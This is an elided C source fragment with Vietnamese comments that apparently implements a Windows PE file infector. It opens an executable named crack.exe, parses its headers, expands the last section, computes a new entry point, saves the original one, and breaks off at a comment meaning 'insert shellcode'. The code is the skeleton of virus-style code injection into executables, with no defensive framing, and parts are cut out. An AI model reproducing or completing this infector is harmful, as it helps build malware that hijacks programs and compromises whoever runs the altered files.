...
int main()
{
	LPCWSTR szFileName = L"D:\\crack.exe";
	HANDLE hFile = CreateFile(szFileName, FILE_READ_ACCESS | FILE_WRITE_ACCESS, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			...
			*/
			if (dos_header->e_magic == IMAGE_DOS_SIGNATURE)
			{
				...
				if (header->Signature == IMAGE_NT_SIGNATURE)
				{
					...
					PIMAGE_SECTION_HEADER lastSection = (PIMAGE_SECTION_HEADER)(pMapping + dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS) + numsec * sizeof(IMAGE_SECTION_HEADER));
					PCHAR pfind;
					/// Tính vị trí các thành phần
					DWORD Characteristics = (DWORD)((DWORD)lastSection - (DWORD)pMapping + 36);
					DWORD RawSize = (DWORD)((DWORD)lastSection - (DWORD)pMapping + 16);
					DWORD VirtualSize = (DWORD)((DWORD)lastSection - (DWORD)pMapping + 8);
					...
					// Cú pháp misc.virtualSize - fix hoàn thành
					// Lỗi handle trên mem CreateFile - fix hoàn thành
					//
					DWORD newSizeOfImage = lastSection->Misc.VirtualSize + lastSection->VirtualAddress;
					DWORD sw = lastSection->PointerToRawData + lastSection->SizeOfRawData;
					DWORD newEOP = lastSection->PointerToRawData + lastSection->SizeOfRawData;
					DWORD RVAnewEOP = newEOP - lastSection->PointerToRawData + lastSection->VirtualAddress;
					// Ghi vào section cuối cùng
					HANDLE hWrite = CreateFile(szFileName, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, NULL);
					// Nới rộng section cuối cùng

					// Lỗi trỏ - fix hoàn thành
					...
					// Lỗi lấy địa chỉ va
					DWORD oldEOP = (DWORD)&header->OptionalHeader.AddressOfEntryPoint;
					oldEOP -= (DWORD)pMapping;
					// chèn shellcode
